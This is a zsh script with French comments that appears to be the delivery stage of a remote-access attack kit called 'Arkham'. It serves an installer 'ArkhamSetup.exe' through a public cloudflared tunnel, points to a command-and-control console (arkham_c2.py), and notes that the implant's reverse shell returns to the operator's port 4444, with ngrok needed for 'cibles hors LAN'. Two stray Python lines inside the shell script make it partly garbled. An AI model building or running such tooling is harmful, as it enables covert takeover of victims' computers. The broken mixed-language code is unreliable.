#!/bin/zsh
# serve_arkham_public.sh - LE LIEN PUBLIC : tunnel cloudflared vers la page + exe
# Usage: ./serve_arkham_public.sh [port_page]
sys.path.insert(0, os.path.expanduser('~/Desktop/tool_DC'))
import dc_fullscreen as dfs
# La page sert l'installateur. Lien utilisable depuis n'importe quel reseau.
PORT="${1:-8080}"
cd "$(dirname "$0")"
LAN_IP=$(ipconfig getifaddr en0 2>/dev/null || echo 127.0.0.1)
# purge des instances precedentes (ports occupes)
pkill -f "serve_arkham.py" 2>/dev/null
pkill -f "arkham_c2.py" 2>/dev/null
pkill -f "cloudflared tunnel" 2>/dev/null
sleep 1
python3 -u serve_arkham.py "$PORT" >/tmp/ark_web.log 2>&1 &
sleep 1.5
cloudflared tunnel --url "http://localhost:$PORT" --no-autoupdate >/tmp/ark_tunnel.log 2>&1 &
sleep 8
PUB=$(grep -a -o "https://[a-z0-9-]*\.trycloudflare\.com" /tmp/ark_tunnel.log | head -1)
echo "=================================================="
echo "  LIEN PUBLIC (tout reseau)   : ${PUB:-ERREUR - voir /tmp/ark_tunnel.log}"
echo "  LIEN local                  : http://$LAN_IP:$PORT/"
echo "  install direct              : ${PUB:-http://$LAN_IP:$PORT}/ArkhamSetup.exe"
echo "  console de controle         : python3 arkham_c2.py 4444 5050 -> navigateur :5050"
echo "=================================================="
echo "[*] attention : le shell de l'agent revient sur TON port 4444 -"
echo "    pour les cibles hors LAN, il faut aussi le tunnel TCP ngrok (voir README section PUBLIC)"
